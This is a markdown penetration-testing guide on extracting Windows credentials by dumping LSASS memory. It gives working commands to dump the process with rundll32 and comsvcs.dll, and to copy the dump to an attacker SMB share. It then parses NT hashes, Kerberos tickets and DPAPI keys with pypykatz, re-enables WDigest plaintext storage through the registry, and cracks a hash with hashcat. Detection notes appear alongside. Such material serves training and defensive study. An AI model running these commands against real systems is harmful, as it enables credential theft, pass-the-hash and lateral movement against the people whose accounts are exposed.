# Attacking LSASS

Attacking LSASS memory is one of the highest-yield credential extraction techniques in Windows post-exploitation. [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) holds live credential material for every active logon session — a single successful dump can yield NT hashes, Kerberos tickets, DPAPI master keys, and on misconfigured systems, plaintext passwords.

<img width="1024" height="574" alt="lsassexe_diagram" src="https://github.com/user-attachments/assets/b8d5c2ce-8383-4136-b00a-0149c51a5d49" />

## Why LSASS Is a Primary Target

Upon any user logon, LSASS immediately caches credentials in its process memory, creates [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens), enforces security policy, and writes events to the [Windows Security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security). This means LSASS holds a live, in-memory snapshot of all active sessions — unlike the SAM database, which requires decryption via the boot key, LSASS credential material is already in a usable state. The technique is catalogued under [MITRE ATT&CK T1003.001](https://attack.mitre.org/techniques/T1003/001/).

## Step 1: Obtaining the LSASS PID

Before dumping LSASS, the current PID assigned to the process must be identified — this value changes between reboots:

```cmd
# CMD
tasklist /svc
# lsass.exe  672  KeyIso, SamSs, VaultSvc

# PowerShell
Get-Process lsass
# Id: 672
```

LSASS is identifiable by the services it hosts: **KeyIso** (Key Isolation), **SamSs** (SAM Service), and **VaultSvc** (Credential Manager Vault).

## Step 2: Creating the Memory Dump

### Method A — Task Manager (GUI)

When an interactive desktop session is available, Task Manager provides the simplest and least tool-dependent approach:

1. **Processes tab** → Right-click **Local Security Authority Process**
2. **Create dump file**

The dump is written to `%temp%\lsass.DMP`. No additional binaries are needed, but this approach requires a graphical session and is impractical over a reverse shell.

### Method B — rundll32 + comsvcs.dll (Headless)

For command-line sessions (WinRM, reverse shell, RDP without GUI elevation), the built-in [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) + `comsvcs.dll` method is the standard approach. `comsvcs.dll` is a legitimate Windows system DLL that exports a `MiniDump` function (ordinal `#24`) which internally calls the native `MiniDumpWriteDump` API:

```powershell
# Elevated PowerShell required
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

The `full` keyword is critical — without it, the dump may be incomplete and fail to parse correctly.

> **Detection:** The `comsvcs.dll` + `MiniDump` pattern is among the most heavily signatured LSASS dump techniques. Splunk, Elastic, Microsoft Defender, and most EDR platforms have dedicated rules for `rundll32.exe` command lines containing `comsvcs.dll` and `MiniDump`. In environments with active endpoint protection, this command will almost certainly be blocked or alerted on without obfuscation.

## Step 3: Transfer to Attack Host

Use the same Impacket [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) method from the SAM section:

```bash
# Attack host
sudo python3 smbserver.py -smb2support CompData /home/user/loot/
```

```cmd
# Windows target
move C:\lsass.dmp \\10.10.15.16\CompData
```

## Step 4: Parsing with Pypykatz

[Pypykatz](https://github.com/skelsec/pypykatz) is a pure-Python reimplementation of Mimikatz's credential parsing logic, designed to run on Linux. Where [Mimikatz](https://github.com/gentilkiwi/mimikatz) requires Windows (meaning either a Windows attack host or execution directly on target), Pypykatz processes dump files entirely offline from a Linux workstation:

```bash
pypykatz lsa minidump /home/user/lsass.dmp
```

Useful flags:

| Flag | Purpose |
|---|---|
| `--json` | Output in JSON format for scripting/parsing |
| `-k <dir>` | Dump Kerberos tickets as `.kirbi` files to a directory |
| `-o <file>` | Write all output to a file instead of stdout |
| `-d` | Parse all dump files in a directory (batch mode) |

## Understanding the Pypykatz Output Sections

Each `LogonSession` block in the output corresponds to one active session in memory at the time of the dump. Each session can contain up to four credential subsections:

### MSV

The `MSV` section corresponds to credentials processed by [msv1_0.dll](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) — the authentication package used for local machine logons and NTLM-based network authentication. This is the primary extraction target:

```
== MSV ==
    Username: bob
    Domain: DESKTOP-33E7O54
    NT: 64f12cddaa88057e06a81b54e73b949b      ← use for cracking or PTH
    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
    LM: NA                                     ← disabled on modern systems
```

The NT hash can be used directly for **Pass-the-Hash** without cracking, or submitted to Hashcat (`-m 1000`) for plaintext recovery.

### WDigest

WDigest was an older HTTP challenge-response authentication protocol enabled by default from Windows XP through Windows 8 / Server 2012. Because WDigest requires the plaintext password to compute challenge responses, LSASS stores the password in cleartext when WDigest is active. Microsoft addressed this in [KB2871997](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/), disabling WDigest-based cleartext caching by default on Windows 8.1+ and Server 2012 R2+:

```
== WDIGEST ==
    username bob
    password None        ← disabled (modern system)
    password (hex)
```

An attacker with SYSTEM access can re-enable WDigest storage by setting a single registry value — no reboot required:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

After the next user logon, `password` in the WDIGEST section will contain the plaintext credential. To disable and restore the secure default:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
```

> **Note:** Modifying the `UseLogonCredential` registry key is itself flagged by most EDR platforms as a high-confidence malicious activity.

### Kerberos

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows domain environments. The `Kerberos` section in a Pypykatz dump exposes the username and domain for sessions authenticated via Kerberos, and — when present — cached TGTs, service tickets, AES session keys, and smart card PINs. These can be used directly for lateral movement without cracking. To dump the tickets as `.kirbi` files for use with tools like [Rubeus](https://github.com/GhostPack/Rubeus) or Impacket's `ticketer.py`:

```bash
pypykatz lsa minidump lsass.dmp -k /home/user/tickets/
```

### DPAPI

The `DPAPI` section exposes the user's [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) master key and its GUID:

```
== DPAPI ==
    key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
    masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107...
    sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

This master key unlocks all DPAPI-protected blobs associated with that user — browser saved passwords (Chrome, Edge), Credential Manager entries, Outlook email credentials, and Wi-Fi pre-shared keys. To extract DPAPI prekeys and master keys separately for offline decryption:

```bash
pypykatz dpapi minidump lsass.dmp -o dpapi_keys
```

## Step 5: Cracking NT Hashes

Once extracted, NT hashes are cracked with [Hashcat](https://hashcat.net/hashcat/) mode `1000`:

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

## Attack Path Summary

| Step | Action | Tool |
|---|---|---|
| 1 | Identify LSASS PID | `tasklist /svc` or `Get-Process lsass` |
| 2a | Dump via GUI | Task Manager → Create dump file |
| 2b | Dump via CLI | `rundll32 comsvcs.dll, MiniDump <PID> lsass.dmp full` |
| 3 | Transfer dump | `smbserver.py` + `move` |
| 4 | Parse credentials | `pypykatz lsa minidump lsass.dmp` |
| 4a | Extract Kerberos tickets | `pypykatz lsa minidump lsass.dmp -k ./tickets/` |
| 4b | Extract DPAPI keys | `pypykatz dpapi minidump lsass.dmp -o dpapi_keys` |
| 5 | Crack NT hashes | `hashcat -m 1000 <hash> rockyou.txt` |
| 5 (alt) | Pass-the-Hash | Use NT hash directly — no cracking needed |
